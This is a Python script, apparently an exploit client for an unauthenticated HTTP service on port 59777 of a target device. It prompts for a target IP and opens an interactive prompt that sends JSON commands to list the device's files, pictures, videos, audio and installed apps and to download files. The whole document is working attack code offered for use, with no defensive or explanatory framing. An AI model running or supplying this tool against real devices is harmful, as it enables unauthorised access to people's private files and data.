import requests
import json
import os
target_ip = input("Enter your target host: ")
target_port = input("Enter remote port to connect to [59777]: ")
if not target_port or target_port == "":
    target_port = 59777

url = 'http://' + target_ip + ':' + str(target_port)
data = json.dumps({'command':'getDeviceInfo'})
header = {"Content-Type" : "application/json"}

req = requests.post(url, data = data, headers = header)
print(req.text)

json_response = json.loads(req.text)
dev_name = json_response["name"]
os.system('cls' if os.name == 'nt' else 'clear')

if dev_name:
    print("Connected to " + dev_name + " successfully, type 'help' to show a list of available commands")

cmds = ['listFiles','listPics','listVideos','listAudios','listApps','listAppsSystem','listAppsPhone','listAppsSdcard','listAppsAll','getFile','getDeviceInfo']

while dev_name:
    cmd = input("[ " + target_ip + " -> " + dev_name + " ] # ")
    if cmd == "help":
        print("Available commands : ")
        print("  listFiles         : List all Files.")
        print("  listPics          : List all Pictures.")
        print("  listVideos        : List all videos.")
        print("  listAudios        : List all audios.")
        print("  listApps          : List Applications installed.")
        print("  listAppsSystem    : List System apps.")
        print("  listAppsPhone     : List Communication related apps.")
        print("  listAppsSdcard    : List apps on the SDCard.")
        print("  listAppsAll       : List all Application.")
        print("  getFile           : Download a file.")
        print("  getDeviceInfo     : Get device info.")
    if cmd in cmds:
        req = requests.post(url, data = json.dumps({'command': cmd}), headers = {"Content-Type": "application/json"})
        print(req.text)
    elif cmd not in cmds and cmd != "help":
        print("Please enter a valid command")
